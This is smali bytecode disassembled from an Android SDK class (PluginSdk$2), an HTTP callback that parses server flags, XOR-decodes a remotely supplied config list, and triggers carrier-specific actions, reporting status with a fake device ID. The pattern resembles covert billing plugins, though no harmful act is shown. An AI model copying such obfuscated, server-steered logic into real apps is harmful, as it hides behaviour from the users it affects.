.class final Lcn/mono/gink/PluginSdk$2;
.super Lcom/loopj/android/http/AsyncHttpResponseHandler;


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lcom/loopj/android/http/AsyncHttpResponseHandler;-><init>()V

    return-void
.end method


# virtual methods
.method public onFailure(Ljava/lang/Throwable;)V
    .locals 3

    sget-object v0, Lcn/mono/gink/PluginSdk;->logger:Lcn/mono/gink/MyLogger;

    const-string v1, "[PluginSdk]"

    const-string v2, "onFailure"

    invoke-virtual {v0, v1, v2}, Lcn/mono/gink/MyLogger;->d(Ljava/lang/String;Ljava/lang/Object;)V

    const/4 v0, 0x1

    invoke-static {v0}, Lcn/mono/gink/PluginSdk;->access$2102(I)I

    const-string v0, "3"

    const-string v1, "888888888888888"

    invoke-static {v0, v1}, Lcn/mono/gink/PluginSdk;->dosubmit_B(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public onFinish()V
    .locals 0

    return-void
.end method

.method public onProgress(II)V
    .locals 0

    return-void
.end method

.method public onRetry()V
    .locals 0

    return-void
.end method

.method public onStart()V
    .locals 0

    return-void
.end method

.method public onSuccess(Ljava/lang/String;)V
    .locals 7

    const/4 v5, 0x2

    const/4 v4, 0x1

    const/4 v1, 0x0

    :try_start_0
    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$300()I

    move-result v0

    if-ne v0, v4, :cond_0

    const/4 v0, 0x2

    invoke-static {v0}, Lcn/mono/gink/PluginSdk;->access$302(I)I

    const-string v0, "2"

    const-string v2, "888888888888888"

    invoke-static {v0, v2}, Lcn/mono/gink/PluginSdk;->dosubmit_B(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_3

    :try_start_1
    const-string v1, "USG_DISABLED"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v1

    invoke-static {v1}, Lcn/mono/gink/PluginSdk;->access$2002(I)I

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$2000()I

    move-result v1

    if-lez v1, :cond_2

    new-instance v1, Landroid/os/Message;

    invoke-direct {v1}, Landroid/os/Message;-><init>()V

    const/16 v2, 0x7da

    iput v2, v1, Landroid/os/Message;->what:I

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$100()Landroid/os/Handler;

    move-result-object v2

    invoke-virtual {v2, v1}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    :cond_1
    :goto_0
    return-void

    :cond_2
    const-string v1, "ORD_DISABLED"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v1

    invoke-static {v1}, Lcn/mono/gink/PluginSdk;->access$2102(I)I

    const-string v1, "PKG_UPDATED"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v1

    if-lez v1, :cond_3

    const-string v1, "PKG_UPDATA"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    const-string v2, "URL"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Lcn/mono/gink/PluginSdk;->access$2102(I)I

    sget-object v2, Lcn/mono/gink/PluginSdk;->logger:Lcn/mono/gink/MyLogger;

    const-string v3, "[PluginSdk]"

    invoke-virtual {v2, v3, v1}, Lcn/mono/gink/MyLogger;->d(Ljava/lang/String;Ljava/lang/Object;)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    :goto_1
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    :cond_3
    const/4 v2, 0x0

    :try_start_2
    const-string v1, "CFG_UPDATED"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    move-result v1

    :goto_2
    if-lez v1, :cond_1

    :try_start_3
    const-string v1, "CFG_UPDATA"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    const-string v1, "CFG_RCPD"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcn/mono/gink/Util;->XorEn(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lorg/json/JSONArray;

    invoke-direct {v1, v0}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Lcn/mono/gink/PluginSdk;->access$1402(Lorg/json/JSONArray;)Lorg/json/JSONArray;

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$1400()Lorg/json/JSONArray;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$1400()Lorg/json/JSONArray;

    move-result-object v0

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_1

    sget v0, Lcn/mono/gink/PluginSdk;->g_sim_type:I

    if-ne v0, v4, :cond_5

    sget-object v0, Lcn/mono/gink/PluginSdk;->logger:Lcn/mono/gink/MyLogger;

    const-string v1, "[PluginSdk]"

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$1400()Lorg/json/JSONArray;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcn/mono/gink/MyLogger;->d(Ljava/lang/String;Ljava/lang/Object;)V

    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    const/16 v1, 0x7df

    iput v1, v0, Landroid/os/Message;->what:I

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$2300()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$2300()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Landroid/os/Message;->obj:Ljava/lang/Object;

    :cond_4
    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$100()Landroid/os/Handler;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    :cond_5
    sget v0, Lcn/mono/gink/PluginSdk;->g_sim_type:I

    if-ne v0, v5, :cond_6

    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    const/16 v1, 0x192

    iput v1, v0, Landroid/os/Message;->what:I

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$100()Landroid/os/Handler;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    :catch_2
    move-exception v1

    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    move v1, v2

    goto :goto_2

    :cond_6
    :try_start_4
    sget v0, Lcn/mono/gink/PluginSdk;->g_sim_type:I

    const/4 v1, 0x3

    if-ne v0, v1, :cond_1

    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    const/16 v1, 0x193

    iput v1, v0, Landroid/os/Message;->what:I

    invoke-static {}, Lcn/mono/gink/PluginSdk;->access$100()Landroid/os/Handler;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_1

    goto/16 :goto_0

    :catch_3
    move-exception v0

    move-object v6, v0

    move-object v0, v1

    move-object v1, v6

    goto/16 :goto_1
.end method
